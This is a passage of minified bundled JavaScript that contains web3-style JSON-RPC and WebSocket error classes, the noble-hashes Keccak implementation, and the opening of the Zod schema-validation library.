        }
    }
    class SR extends Le {
        constructor(e) {
            super(e, "not a valid unsigned integer."),
            this.code = RT
        }
    }
    class nA extends Le {
        constructor(e) {
            super(e, "invalid size given."),
            this.code = BT
        }
    }
    class iA extends Le {
        constructor(e) {
            super(e, "value is larger than size."),
            this.code = CT
        }
    }
    class TR extends Le {
        constructor(e) {
            super(e, "invalid string given"),
            this.code = IT
        }
    }
    const RR = t => !Array.isArray(t) && t.jsonrpc === "2.0" && !!t && (t.result === void 0 || t.result === null) && "error"in t && (typeof t.id == "number" || typeof t.id == "string")
      , rA = t => RR(t) ? t.error.message : "";
    class hi extends Re {
        constructor(e, n, s, o) {
            var l;
            super(n ?? `Returned error: ${Array.isArray(e) ? e.map(d => rA(d)).join(",") : rA(e)}`),
            this.code = JS,
            n || (this.data = Array.isArray(e) ? e.map(d => {
                var p;
                return (p = d.error) === null || p === void 0 ? void 0 : p.data
            }
            ) : (l = e?.error) === null || l === void 0 ? void 0 : l.data),
            this.statusCode = o,
            this.request = s;
            let u;
            "error"in e ? u = e.error : e instanceof Array && (u = e.filter(d => d.error).map(d => d.error)),
            Array.isArray(u) && u.length > 0 ? this.cause = new Sl(u) : this.cause = u
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                data: this.data,
                request: this.request,
                statusCode: this.statusCode
            })
        }
    }
    class Ld extends hi {
        constructor(e, n) {
            super(e, void 0, n),
            this.code = $S;
            let s;
            "error"in e ? s = e.error : e instanceof Array && (s = e.map(o => o.error)),
            Array.isArray(s) ? this.cause = new Sl(s) : this.cause = s
        }
    }
    class sA extends Re {
        constructor(e, n) {
            super(`Web3Config hardfork doesnt match in defaultHardfork ${e} and common.hardfork ${n}`),
            this.code = h1
        }
    }
    class aA extends Re {
        constructor(e, n) {
            super(`Web3Config chain doesnt match in defaultHardfork ${e} and common.hardfork ${n}`),
            this.code = h1
        }
    }
    const T1 = "An Rpc error has occured with a code of *code*"
      , Yt = {
        [zu]: {
            message: "Parse error",
            description: "Invalid JSON"
        },
        [Gu]: {
            message: "Invalid request",
            description: "JSON is not a valid request object	"
        },
        [qu]: {
            message: "Method not found",
            description: "Method does not exist	"
        },
        [Fu]: {
            message: "Invalid params",
            description: "Invalid method parameters"
        },
        [Qu]: {
            message: "Internal error",
            description: "Internal JSON-RPC error"
        },
        [Vu]: {
            message: "Invalid input",
            description: "Missing or invalid parameters"
        },
        [Yu]: {
            message: "Resource not found",
            description: "Requested resource not found"
        },
        [Zu]: {
            message: "Resource unavailable",
            description: "Requested resource not available"
        },
        [Ku]: {
            message: "Transaction rejected",
            description: "Transaction creation failed"
        },
        [Xu]: {
            message: "Method not supported",
            description: "Method is not implemented"
        },
        [Ju]: {
            message: "Limit exceeded",
            description: "Request exceeds defined limit"
        },
        [$u]: {
            message: "JSON-RPC version not supported",
            description: "Version of JSON-RPC protocol is not supported"
        },
        [hT]: {
            name: "User Rejected Request",
            message: "The user rejected the request."
        },
        [mT]: {
            name: "Unauthorized",
            message: "The requested method and/or account has not been authorized by the user."
        },
        [pT]: {
            name: "Unsupported Method",
            message: "The Provider does not support the requested method."
        },
        [gT]: {
            name: "Disconnected",
            message: "The Provider is disconnected from all chains."
        },
        [yT]: {
            name: "Chain Disconnected",
            message: "The Provider is not connected to the requested chain."
        },
        "0-999": {
            name: "",
            message: "Not used."
        },
        1e3: {
            name: "Normal Closure",
            message: "The connection successfully completed the purpose for which it was created."
        },
        1001: {
            name: "Going Away",
            message: "The endpoint is going away, either because of a server failure or because the browser is navigating away from the page that opened the connection."
        },
        1002: {
            name: "Protocol error",
            message: "The endpoint is terminating the connection due to a protocol error."
        },
        1003: {
            name: "Unsupported Data",
            message: "The connection is being terminated because the endpoint received data of a type it cannot accept. (For example, a text-only endpoint received binary data.)"
        },
        1004: {
            name: "Reserved",
            message: "Reserved. A meaning might be defined in the future."
        },
        1005: {
            name: "No Status Rcvd",
            message: "Reserved. Indicates that no status code was provided even though one was expected."
        },
        1006: {
            name: "Abnormal Closure",
            message: "Reserved. Indicates that a connection was closed abnormally (that is, with no close frame being sent) when a status code is expected."
        },
        1007: {
            name: "Invalid frame payload data",
            message: "The endpoint is terminating the connection because a message was received that contained inconsistent data (e.g., non-UTF-8 data within a text message)."
        },
        1008: {
            name: "Policy Violation",
            message: "The endpoint is terminating the connection because it received a message that violates its policy. This is a generic status code, used when codes 1003 and 1009 are not suitable."
        },
        1009: {
            name: "Message Too Big",
            message: "The endpoint is terminating the connection because a data frame was received that is too large."
        },
        1010: {
            name: "Mandatory Ext.",
            message: "The client is terminating the connection because it expected the server to negotiate one or more extension, but the server didn't."
        },
        1011: {
            name: "Internal Error",
            message: "The server is terminating the connection because it encountered an unexpected condition that prevented it from fulfilling the request."
        },
        1012: {
            name: "Service Restart",
            message: "The server is terminating the connection because it is restarting."
        },
        1013: {
            name: "Try Again Later",
            message: "The server is terminating the connection due to a temporary condition, e.g. it is overloaded and is casting off some of its clients."
        },
        1014: {
            name: "Bad Gateway",
            message: "The server was acting as a gateway or proxy and received an invalid response from the upstream server. This is similar to 502 HTTP Status Code."
        },
        1015: {
            name: "TLS handshake",
            message: "Reserved. Indicates that the connection was closed due to a failure to perform a TLS handshake (e.g., the server certificate can't be verified)."
        },
        "1016-2999": {
            name: "",
            message: "For definition by future revisions of the WebSocket Protocol specification, and for definition by extension specifications."
        },
        "3000-3999": {
            name: "",
            message: "For use by libraries, frameworks, and applications. These status codes are registered directly with IANA. The interpretation of these codes is undefined by the WebSocket protocol."
        },
        "4000-4999": {
            name: "",
            message: "For private use, and thus can't be registered. Such codes can be used by prior agreements between WebSocket applications. The interpretation of these codes is undefined by the WebSocket protocol."
        }
    };
    class Rn extends Re {
        constructor(e, n) {
            super(n ?? T1.replace("*code*", e.error.code.toString())),
            this.code = e.error.code,
            this.id = e.id,
            this.jsonrpc = e.jsonrpc,
            this.jsonRpcError = e.error
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                error: this.jsonRpcError,
                id: this.id,
                jsonRpc: this.jsonrpc
            })
        }
    }
    class BR extends Re {
        constructor(e, n) {
            var s, o, l, u;
            if (!e)
                super();
            else if (!((s = Yt[e]) === null || s === void 0) && s.message)
                super(Yt[e].message);
            else {
                const d = Object.keys(Yt).find(p => typeof p == "string" && e >= parseInt(p.split("-")[0], 10) && e <= parseInt(p.split("-")[1], 10));
                super((l = (o = Yt[d ?? ""]) === null || o === void 0 ? void 0 : o.message) !== null && l !== void 0 ? l : T1.replace("*code*", (u = e?.toString()) !== null && u !== void 0 ? u : '""'))
            }
            this.code = e,
            this.data = n
        }
    }
    class CR extends Rn {
        constructor(e) {
            super(e, Yt[zu].message),
            this.code = zu
        }
    }
    class IR extends Rn {
        constructor(e) {
            super(e, Yt[Gu].message),
            this.code = Gu
        }
    }
    class kR extends Rn {
        constructor(e) {
            super(e, Yt[qu].message),
            this.code = qu
        }
    }
    class OR extends Rn {
        constructor(e) {
            super(e, Yt[Fu].message),
            this.code = Fu
        }
    }
    class NR extends Rn {
        constructor(e) {
            super(e, Yt[Qu].message),
            this.code = Qu
        }
    }
    class MR extends Rn {
        constructor(e) {
            super(e, Yt[Vu].message),
            this.code = Vu
        }
    }
    class DR extends Rn {
        constructor(e) {
            super(e, Yt[Xu].message),
            this.code = Xu
        }
    }
    class LR extends Rn {
        constructor(e) {
            super(e, Yt[Zu].message),
            this.code = Zu
        }
    }
    class UR extends Rn {
        constructor(e) {
            super(e, Yt[Yu].message),
            this.code = Yu
        }
    }
    class jR extends Rn {
        constructor(e) {
            super(e, Yt[$u].message),
            this.code = $u
        }
    }
    class PR extends Rn {
        constructor(e) {
            super(e, Yt[Ku].message),
            this.code = Ku
        }
    }
    class HR extends Rn {
        constructor(e) {
            super(e, Yt[Ju].message),
            this.code = Ju
        }
    }
    const en = new Map;
    en.set(zu, {
        error: CR
    });
    en.set(Gu, {
        error: IR
    });
    en.set(qu, {
        error: kR
    });
    en.set(Fu, {
        error: OR
    });
    en.set(Qu, {
        error: NR
    });
    en.set(Vu, {
        error: MR
    });
    en.set(Xu, {
        error: DR
    });
    en.set(Zu, {
        error: LR
    });
    en.set(Ku, {
        error: PR
    });
    en.set(Yu, {
        error: UR
    });
    en.set($u, {
        error: jR
    });
    en.set(Ju, {
        error: HR
    });
    class zR extends Re {
        constructor(e) {
            super(`Format for the type ${e} is unsupported`),
            this.type = e,
            this.code = MT
        }
        toJSON() {
            return Object.assign(Object.assign({}, super.toJSON()), {
                type: this.type
            })
        }
    }
    function dn(t) {
        if (!Number.isSafeInteger(t) || t < 0)
            throw new Error(`positive integer expected, not ${t}`)
    }
    function GR(t) {
        if (typeof t != "boolean")
            throw new Error(`boolean expected, not ${t}`)
    }
    function qR(t) {
        return t instanceof Uint8Array || t != null && typeof t == "object" && t.constructor.name === "Uint8Array"
    }
    function ao(t, ...e) {
        if (!qR(t))
            throw new Error("Uint8Array expected");
        if (e.length > 0 && !e.includes(t.length))
            throw new Error(`Uint8Array expected of length ${e}, not of length=${t.length}`)
    }
    function Qp(t) {
        if (typeof t != "function" || typeof t.create != "function")
            throw new Error("Hash should be wrapped by utils.wrapConstructor");
        dn(t.outputLen),
        dn(t.blockLen)
    }
    function Ts(t, e=!0) {
        if (t.destroyed)
            throw new Error("Hash instance has been destroyed");
        if (e && t.finished)
            throw new Error("Hash#digest() has already been called")
    }
    function Vp(t, e) {
        ao(t);
        const n = e.outputLen;
        if (t.length < n)
            throw new Error(`digestInto() expects output buffer of length at least ${n}`)
    }
    const R1 = {
        number: dn,
        bool: GR,
        bytes: ao,
        hash: Qp,
        exists: Ts,
        output: Vp
    }
      , xu = BigInt(2 ** 32 - 1)
      , oA = BigInt(32);
    function FR(t, e=!1) {
        return e ? {
            h: Number(t & xu),
            l: Number(t >> oA & xu)
        } : {
            h: Number(t >> oA & xu) | 0,
            l: Number(t & xu) | 0
        }
    }
    function QR(t, e=!1) {
        let n = new Uint32Array(t.length)
          , s = new Uint32Array(t.length);
        for (let o = 0; o < t.length; o++) {
            const {h: l, l: u} = FR(t[o], e);
            [n[o],s[o]] = [l, u]
        }
        return [n, s]
    }
    const VR = (t, e, n) => t << n | e >>> 32 - n
      , YR = (t, e, n) => e << n | t >>> 32 - n
      , ZR = (t, e, n) => e << n - 32 | t >>> 64 - n
      , KR = (t, e, n) => t << n - 32 | e >>> 64 - n
      , ku = typeof globalThis == "object" && "crypto"in globalThis ? globalThis.crypto : void 0;
    /*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */
    const Ou = t => new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength / 4))
      , Nu = t => new DataView(t.buffer,t.byteOffset,t.byteLength)
      , ui = (t, e) => t << 32 - e | t >>> e
      , Ye = (t, e) => t << e | t >>> 32 - e >>> 0
      , ed = new Uint8Array(new Uint32Array([287454020]).buffer)[0] === 68
      , XR = t => t << 24 & 4278190080 | t << 8 & 16711680 | t >>> 8 & 65280 | t >>> 24 & 255;
    function td(t) {
        for (let e = 0; e < t.length; e++)
            t[e] = XR(t[e])
    }
    function Ga(t) {
        if (typeof t != "string")
            throw new Error(`utf8ToBytes expected string, got ${typeof t}`);
        return new Uint8Array(new TextEncoder().encode(t))
    }
    function qa(t) {
        return typeof t == "string" && (t = Ga(t)),
        ao(t),
        t
    }
    function nd(...t) {
        let e = 0;
        for (let s = 0; s < t.length; s++) {
            const o = t[s];
            ao(o),
            e += o.length
        }
        const n = new Uint8Array(e);
        for (let s = 0, o = 0; s < t.length; s++) {
            const l = t[s];
            n.set(l, o),
            o += l.length
        }
        return n
    }
    class Yp {
        clone() {
            return this._cloneInto()
        }
    }
    const JR = {}.toString;
    function B1(t, e) {
        if (e !== void 0 && JR.call(e) !== "[object Object]")
            throw new Error("Options should be object or undefined");
        return Object.assign(t, e)
    }
    function C1(t) {
        const e = s => t().update(qa(s)).digest()
          , n = t();
        return e.outputLen = n.outputLen,
        e.blockLen = n.blockLen,
        e.create = () => t(),
        e
    }
    function I1(t=32) {
        if (ku && typeof ku.getRandomValues == "function")
            return ku.getRandomValues(new Uint8Array(t));
        throw new Error("crypto.getRandomValues must be defined")
    }
    const k1 = []
      , O1 = []
      , N1 = []
      , $R = BigInt(0)
      , ml = BigInt(1)
      , WR = BigInt(2)
      , eB = BigInt(7)
      , tB = BigInt(256)
      , nB = BigInt(113);
    for (let t = 0, e = ml, n = 1, s = 0; t < 24; t++) {
        [n,s] = [s, (2 * n + 3 * s) % 5],
        k1.push(2 * (5 * s + n)),
        O1.push((t + 1) * (t + 2) / 2 % 64);
        let o = $R;
        for (let l = 0; l < 7; l++)
            e = (e << ml ^ (e >> eB) * nB) % tB,
            e & WR && (o ^= ml << (ml << BigInt(l)) - ml);
        N1.push(o)
    }
    const [iB,rB] = QR(N1, !0)
      , lA = (t, e, n) => n > 32 ? ZR(t, e, n) : VR(t, e, n)
      , cA = (t, e, n) => n > 32 ? KR(t, e, n) : YR(t, e, n);
    function sB(t, e=24) {
        const n = new Uint32Array(10);
        for (let s = 24 - e; s < 24; s++) {
            for (let u = 0; u < 10; u++)
                n[u] = t[u] ^ t[u + 10] ^ t[u + 20] ^ t[u + 30] ^ t[u + 40];
            for (let u = 0; u < 10; u += 2) {
                const d = (u + 8) % 10
                  , p = (u + 2) % 10
                  , h = n[p]
                  , m = n[p + 1]
                  , y = lA(h, m, 1) ^ n[d]
                  , w = cA(h, m, 1) ^ n[d + 1];
                for (let E = 0; E < 50; E += 10)
                    t[u + E] ^= y,
                    t[u + E + 1] ^= w
            }
            let o = t[2]
              , l = t[3];
            for (let u = 0; u < 24; u++) {
                const d = O1[u]
                  , p = lA(o, l, d)
                  , h = cA(o, l, d)
                  , m = k1[u];
                o = t[m],
                l = t[m + 1],
                t[m] = p,
                t[m + 1] = h
            }
            for (let u = 0; u < 50; u += 10) {
                for (let d = 0; d < 10; d++)
                    n[d] = t[u + d];
                for (let d = 0; d < 10; d++)
                    t[u + d] ^= ~n[(d + 2) % 10] & n[(d + 4) % 10]
            }
            t[0] ^= iB[s],
            t[1] ^= rB[s]
        }
        n.fill(0)
    }
    class Zp extends Yp {
        constructor(e, n, s, o=!1, l=24) {
            if (super(),
            this.blockLen = e,
            this.suffix = n,
            this.outputLen = s,
            this.enableXOF = o,
            this.rounds = l,
            this.pos = 0,
            this.posOut = 0,
            this.finished = !1,
            this.destroyed = !1,
            dn(s),
            0 >= this.blockLen || this.blockLen >= 200)
                throw new Error("Sha3 supports only keccak-f1600 function");
            this.state = new Uint8Array(200),
            this.state32 = Ou(this.state)
        }
        keccak() {
            ed || td(this.state32),
            sB(this.state32, this.rounds),
            ed || td(this.state32),
            this.posOut = 0,
            this.pos = 0
        }
        update(e) {
            Ts(this);
            const {blockLen: n, state: s} = this;
            e = qa(e);
            const o = e.length;
            for (let l = 0; l < o; ) {
                const u = Math.min(n - this.pos, o - l);
                for (let d = 0; d < u; d++)
                    s[this.pos++] ^= e[l++];
                this.pos === n && this.keccak()
            }
            return this
        }
        finish() {
            if (this.finished)
                return;
            this.finished = !0;
            const {state: e, suffix: n, pos: s, blockLen: o} = this;
            e[s] ^= n,
            (n & 128) !== 0 && s === o - 1 && this.keccak(),
            e[o - 1] ^= 128,
            this.keccak()
        }
        writeInto(e) {
            Ts(this, !1),
            ao(e),
            this.finish();
            const n = this.state
              , {blockLen: s} = this;
            for (let o = 0, l = e.length; o < l; ) {
                this.posOut >= s && this.keccak();
                const u = Math.min(s - this.posOut, l - o);
                e.set(n.subarray(this.posOut, this.posOut + u), o),
                this.posOut += u,
                o += u
            }
            return e
        }
        xofInto(e) {
            if (!this.enableXOF)
                throw new Error("XOF is not possible for this instance");
            return this.writeInto(e)
        }
        xof(e) {
            return dn(e),
            this.xofInto(new Uint8Array(e))
        }
        digestInto(e) {
            if (Vp(e, this),
            this.finished)
                throw new Error("digest() was already called");
            return this.writeInto(e),
            this.destroy(),
            e
        }
        digest() {
            return this.digestInto(new Uint8Array(this.outputLen))
        }
        destroy() {
            this.destroyed = !0,
            this.state.fill(0)
        }
        _cloneInto(e) {
            const {blockLen: n, suffix: s, outputLen: o, rounds: l, enableXOF: u} = this;
            return e || (e = new Zp(n,s,o,u,l)),
            e.state32.set(this.state32),
            e.pos = this.pos,
            e.posOut = this.posOut,
            e.finished = this.finished,
            e.rounds = l,
            e.suffix = s,
            e.outputLen = o,
            e.enableXOF = u,
            e.destroyed = this.destroyed,
            e
        }
    }
    const aB = (t, e, n) => C1( () => new Zp(e,t,n))
      , uA = aB(1, 136, 256 / 8)
      , id = R1.bytes;
    function M1(t) {
        if (!(t instanceof Uint8Array))
            throw new TypeError(`bytesToUtf8 expected Uint8Array, got ${typeof t}`);
        return new TextDecoder().decode(t)
    }
    function oB(t, e) {
        if (t.length !== e.length)
            return !1;
        for (let n = 0; n < t.length; n++)
            if (t[n] !== e[n])
                return !1;
        return !0
    }
    function lB(t) {
        return e => (R1.bytes(e),
        t(e))
    }
    ( () => {
        const t = typeof globalThis == "object" && "crypto"in globalThis ? globalThis.crypto : void 0
          , e = typeof El < "u" && typeof El.require == "function" && El.require.bind(El);
        return {
            node: e && !t ? e("crypto") : void 0,
            web: t
        }
    }
    )();
    const Jt = ( () => {
        const t = lB(uA);
        return t.create = uA.create,
        t
    }
    )();
    var Qe;
    (function(t) {
        t.assertEqual = o => {}
        ;
        function e(o) {}
        t.assertIs = e;
        function n(o) {
            throw new Error
        }
        t.assertNever = n,
        t.arrayToEnum = o => {
            const l = {};
            for (const u of o)
                l[u] = u;
            return l
        }
        ,
        t.getValidEnumValues = o => {
            const l = t.objectKeys(o).filter(d => typeof o[o[d]] != "number")
              , u = {};
            for (const d of l)
                u[d] = o[d];
            return t.objectValues(u)
        }
        ,
        t.objectValues = o => t.objectKeys(o).map(function(l) {
            return o[l]
        }),
        t.objectKeys = typeof Object.keys == "function" ? o => Object.keys(o) : o => {
            const l = [];
            for (const u in o)
                Object.prototype.hasOwnProperty.call(o, u) && l.push(u);
            return l
        }
        ,
        t.find = (o, l) => {
            for (const u of o)
                if (l(u))
                    return u
        }
        ,
        t.isInteger = typeof Number.isInteger == "function" ? o => Number.isInteger(o) : o => typeof o == "number" && Number.isFinite(o) && Math.floor(o) === o;
        function s(o, l=" | ") {
            return o.map(u => typeof u == "string" ? `'${u}'` : u).join(l)
        }
        t.joinValues = s,
        t.jsonStringifyReplacer = (o, l) => typeof l == "bigint" ? l.toString() : l
    }
    )(Qe || (Qe = {}));
    var ip;
    (function(t) {
        t.mergeShapes = (e, n) => ({
            ...e,
            ...n
        })
    }
    )(ip || (ip = {}));
    const fe = Qe.arrayToEnum(["string", "nan", "number", "integer", "float", "boolean", "date", "bigint", "symbol", "function", "undefined", "null", "array", "object", "unknown", "promise", "void", "never", "map", "set"])
      , Zi = t => {
        switch (typeof t) {
        case "undefined":
            return fe.undefined;
        case "string":
            return fe.string;
        case "number":
            return Number.isNaN(t) ? fe.nan : fe.number;
        case "boolean":
            return fe.boolean;
        case "function":
            return fe.function;
        case "bigint":
            return fe.bigint;
        case "symbol":
            return fe.symbol;
        case "object":
            return Array.isArray(t) ? fe.array : t === null ? fe.null : t.then && typeof t.then == "function" && t.catch && typeof t.catch == "function" ? fe.promise : typeof Map < "u" && t instanceof Map ? fe.map : typeof Set < "u" && t instanceof Set ? fe.set : typeof Date < "u" && t instanceof Date ? fe.date : fe.object;
        default:
            return fe.unknown
        }
    }
      , te = Qe.arrayToEnum(["invalid_type", "invalid_literal", "custom", "invalid_union", "invalid_union_discriminator", "invalid_enum_value", "unrecognized_keys", "invalid_arguments", "invalid_return_type", "invalid_date", "invalid_string", "too_small", "too_big", "invalid_intersection_types", "not_multiple_of", "not_finite"])
      , cB = t => JSON.stringify(t, null, 2).replace(/"([^"]+)":/g, "$1:");
    class xn extends Error {
        get errors() {
            return this.issues
        }
        constructor(e) {
            super(),
            this.issues = [],
            this.addIssue = s => {
                this.issues = [...this.issues, s]
            }
            ,
            this.addIssues = (s=[]) => {
                this.issues = [...this.issues, ...s]
            }
            ;
            const n = new.target.prototype;
            Object.setPrototypeOf ? Object.setPrototypeOf(this, n) : this.__proto__ = n,
            this.name = "ZodError",
            this.issues = e
        }
        format(e) {
            const n = e || function(l) {
                return l.message
            }
              , s = {
                _errors: []
            }
              , o = l => {
                for (const u of l.issues)
                    if (u.code === "invalid_union")
                        u.unionErrors.map(o);
                    else if (u.code === "invalid_return_type")
                        o(u.returnTypeError);
                    else if (u.code === "invalid_arguments")
                        o(u.argumentsError);
                    else if (u.path.length === 0)
                        s._errors.push(n(u));
                    else {
                        let d = s
                          , p = 0;
                        for (; p < u.path.length; ) {
                            const h = u.path[p];
                            p === u.path.length - 1 ? (d[h] = d[h] || {
                                _errors: []
                            },
                            d[h]._errors.push(n(u))) : d[h] = d[h] || {
                                _errors: []
                            },
                            d = d[h],
                            p++
                        }
                    }
            }
            ;
            return o(this),
            s
        }
        static assert(e) {
            if (!(e instanceof xn))
                throw new Error(`Not a ZodError: ${e}`)
        }
        toString() {
            return this.message
        }
        get message() {
            return JSON.stringify(this.issues, Qe.jsonStringifyReplacer, 2)
        }
        get isEmpty() {
            return this.issues.length === 0
        }
        flatten(e=n => n.message) {
            const n = {}
              , s = [];
            for (const o of this.issues)
                if (o.path.length > 0) {
                    const l = o.path[0];
                    n[l] = n[l] || [],
                    n[l].push(e(o))
                } else
                    s.push(e(o));
            return {
                formErrors: s,
                fieldErrors: n
            }
        }
        get formErrors() {
            return this.flatten()
        }
    }
    xn.create = t => new xn(t);
    const Fa = (t, e) => {
        let n;
        switch (t.code) {
        case te.invalid_type:
            t.received === fe.undefined ? n = "Required" : n = `Expected ${t.expected}, received ${t.received}`;
            break;
        case te.invalid_literal:
            n = `Invalid literal value, expected ${JSON.stringify(t.expected, Qe.jsonStringifyReplacer)}`;
            break;
        case te.unrecognized_keys:
            n = `Unrecognized key(s) in object: ${Qe.joinValues(t.keys, ", ")}`;
            break;
        case te.invalid_union:
            n = "Invalid input";
            break;
        case te.invalid_union_discriminator:
            n = `Invalid discriminator value. Expected ${Qe.joinValues(t.options)}`;
            break;
        case te.invalid_enum_value:
            n = `Invalid enum value. Expected ${Qe.joinValues(t.options)}, received '${t.received}'`;
            break;
        case te.invalid_arguments:
            n = "Invalid function arguments";
            break;
        case te.invalid_return_type:
            n = "Invalid function return type";
            break;
        case te.invalid_date:
            n = "Invalid date";
            break;
        case te.invalid_string:
            typeof t.validation == "object" ? "includes"in t.validation ? (n = `Invalid input: must include "${t.validation.includes}"`,
            typeof t.validation.position == "number" && (n = `${n} at one or more positions greater than or equal to ${t.validation.position}`)) : "startsWith"in t.validation ? n = `Invalid input: must start with "${t.validation.startsWith}"` : "endsWith"in t.validation ? n = `Invalid input: must end with "${t.validation.endsWith}"` : Qe.assertNever(t.validation) : t.validation !== "regex" ? n = `Invalid ${t.validation}` : n = "Invalid";
            break;
        case te.too_small:
            t.type === "array" ? n = `Array must contain ${t.exact ? "exactly" : t.inclusive ? "at least" : "more than"} ${t.minimum} element(s)` : t.type === "string" ? n = `String must contain ${t.exact ? "exactly" : t.inclusive ? "at least" : "over"} ${t.minimum} character(s)` : t.type === "number" ? n = `Number must be ${t.exact ? "exactly equal to " : t.inclusive ? "greater than or equal to " : "greater than "}${t.minimum}` : t.type === "bigint" ? n = `Number must be ${t.exact ? "exactly equal to " : t.inclusive ? "greater than or equal to " : "greater than "}${t.minimum}` : t.type === "date" ? n = `Date must be ${t.exact ? "exactly equal to " : t.inclusive ? "greater than or equal to " : "greater than "}${new Date(Number(t.minimum))}` : n = "Invalid input";
            break;
        case te.too_big:
            t.type === "array" ? n = `Array must contain ${t.exact ? "exactly" : t.inclusive ? "at most" : "less than"} ${t.maximum} element(s)` : t.type === "string" ? n = `String must contain ${t.exact ? "exactly" : t.inclusive ? "at most" : "under"} ${t.maximum} character(s)` : t.type === "number" ? n = `Number must be ${t.exact ? "exactly" : t.inclusive ? "less than or equal to" : "less than"} ${t.maximum}` : t.type === "bigint" ? n = `BigInt must be ${t.exact ? "exactly" : t.inclusive ? "less than or equal to" : "less than"} ${t.maximum}` : t.type === "date" ? n = `Date must be ${t.exact ? "exactly" : t.inclusive ? "smaller than or equal to" : "smaller than"} ${new Date(Number(t.maximum))}` : n = "Invalid input";
            break;
        case te.custom:
            n = "Invalid input";
            break;
        case te.invalid_intersection_types:
            n = "Intersection results could not be merged";
            break;
        case te.not_multiple_of:
            n = `Number must be a multiple of ${t.multipleOf}`;
            break;
        case te.not_finite:
            n = "Number must be finite";
            break;
        default:
            n = e.defaultError,
            Qe.assertNever(t)
        }
        return {
            message: n
        }
    }
    ;
    let D1 = Fa;
    function uB(t) {
        D1 = t
    }
    function rd() {
        return D1
    }
    const sd = t => {
        const {data: e, path: n, errorMaps: s, issueData: o} = t
          , l = [...n, ...o.path || []]
          , u = {
            ...o,
            path: l
        };
        if (o.message !== void 0)
            return {
                ...o,
                path: l,
                message: o.message
            };
        let d = "";
        const p = s.filter(h => !!h).slice().reverse();
        for (const h of p)
            d = h(u, {
                data: e,
                defaultError: d
            }).message;
        return {
            ...o,
            path: l,
            message: d
        }
    }
      , dB = [];
    function ce(t, e) {
        const n = rd()
          , s = sd({
            issueData: e,
            data: t.data,
            path: t.path,
            errorMaps: [t.common.contextualErrorMap, t.schemaErrorMap, n, n === Fa ? void 0 : Fa].filter(o => !!o)
        });
        t.common.issues.push(s)
    }
    class Zt {
        constructor() {
            this.value = "valid"
        }
        dirty() {
            this.value === "valid" && (this.value = "dirty")
        }
        abort() {
            this.value !== "aborted" && (this.value = "aborted")
        }
        static mergeArray(e, n) {
            const s = [];
            for (const o of n) {
                if (o.status === "aborted")
                    return xe;
                o.status === "dirty" && e.dirty(),
                s.push(o.value)
            }
            return {
                status: e.value,
                value: s
            }
        }
        static async mergeObjectAsync(e, n) {
            const s = [];
            for (const o of n) {
                const l = await o.key
                  , u = await o.value;
                s.push({
                    key: l,
                    value: u
                })
            }
            return Zt.mergeObjectSync(e, s)
        }
        static mergeObjectSync(e, n) {
            const s = {};
            for (const o of n) {
                const {key: l, value: u} = o;
                if (l.status === "aborted" || u.status === "aborted")
                    return xe;
                l.status === "dirty" && e.dirty(),
                u.status === "dirty" && e.dirty(),
                l.value !== "__proto__" && (typeof u.value < "u" || o.alwaysSet) && (s[l.value] = u.value)
            }
            return {
                status: e.value,
                value: s
            }
        }
    }
    const xe = Object.freeze({
        status: "aborted"
    })
      , La = t => ({
        status: "dirty",
        value: t
    })
      , tn = t => ({
        status: "valid",
        value: t
    })
      , rp = t => t.status === "aborted"
      , sp = t => t.status === "dirty"
      , Rs = t => t.status === "valid"
      , Cl = t => typeof Promise < "u" && t instanceof Promise;
    var pe;
    (function(t) {
        t.errToObj = e => typeof e == "string" ? {
            message: e
        } : e || {},
        t.toString = e => typeof e == "string" ? e : e?.message
    }
    )(pe || (pe = {}));
    class vi {
        constructor(e, n, s, o) {
            this._cachedPath = [],
            this.parent = e,
            this.data = n,
            this._path = s,
            this._key = o
        }
        get path() {
            return this._cachedPath.length || (Array.isArray(this._key) ? this._cachedPath.push(...this._path, ...this._key) : this._cachedPath.push(...this._path, this._key)),
            this._cachedPath
        }
    }
    const dA = (t, e) => {
        if (Rs(e))
            return {
                success: !0,
                data: e.value
            };
        if (!t.common.issues.length)
            throw new Error("Validation failed but no issues detected.");
        return {
            success: !1,
            get error() {
                if (this._error)
                    return this._error;
                const n = new xn(t.common.issues);
                return this._error = n,
                this._error
            }
        }
    }
    ;
    function Oe(t) {
        if (!t)
            return {};
        const {errorMap: e, invalid_type_error: n, required_error: s, description: o} = t;
        if (e && (n || s))
            throw new Error(`Can't use "invalid_type_error" or "required_error" in conjunction with custom error map.`);
        return e ? {
            errorMap: e,
            description: o
        } : {
            errorMap: (u, d) => {
                const {message: p} = t;
                return u.code === "invalid_enum_value" ? {
                    message: p ?? d.defaultError
                } : typeof d.data > "u" ? {
                    message: p ?? s ?? d.defaultError
                } : u.code !== "invalid_type" ? {
                    message: d.defaultError
                } : {
                    message: p ?? n ?? d.defaultError
                }
            }
            ,
            description: o
        }
    }
    class Me {
        get description() {
            return this._def.description
        }
        _getType(e) {
            return Zi(e.data)
        }
        _getOrReturnCtx(e, n) {
            return n || {
                common: e.parent.common,
                data: e.data,
                parsedType: Zi(e.data),
                schemaErrorMap: this._def.errorMap,
                path: e.path,
                parent: e.parent
            }
        }
        _processInputParams(e) {
            return {
                status: new Zt,
                ctx: {
                    common: e.parent.common,
                    data: e.data,
                    parsedType: Zi(e.data),
                    schemaErrorMap: this._def.errorMap,
                    path: e.path,
                    parent: e.parent
                }
            }
        }
        _parseSync(e) {
            const n = this._parse(e);
            if (Cl(n))
                throw new Error("Synchronous parse encountered promise.");
            return n
        }
        _parseAsync(e) {
            const n = this._parse(e);
            return Promise.resolve(n)
        }
        parse(e, n) {
            const s = this.safeParse(e, n);
            if (s.success)
                return s.data;
            throw s.error
        }
        safeParse(e, n) {
            const s = {
                common: {
                    issues: [],
                    async: n?.async ?? !1,
                    contextualErrorMap: n?.errorMap
                },
                path: n?.path || [],
                schemaErrorMap: this._def.errorMap,
                parent: null,
                data: e,
                parsedType: Zi(e)
            }
              , o = this._parseSync({
                data: e,
                path: s.path,
                parent: s
            });
            return dA(s, o)
        }
        "~validate"(e) {
            const n = {
                common: {
                    issues: [],
                    async: !!this["~standard"].async
                },
                path: [],
                schemaErrorMap: this._def.errorMap,
                parent: null,
                data: e,
                parsedType: Zi(e)
            };
            if (!this["~standard"].async)
                try {
                    const s = this._parseSync({
                        data: e,
                        path: [],
                        parent: n
                    });
                    return Rs(s) ? {
                        value: s.value
                    } : {
                        issues: n.common.issues
                    }
                } catch (s) {
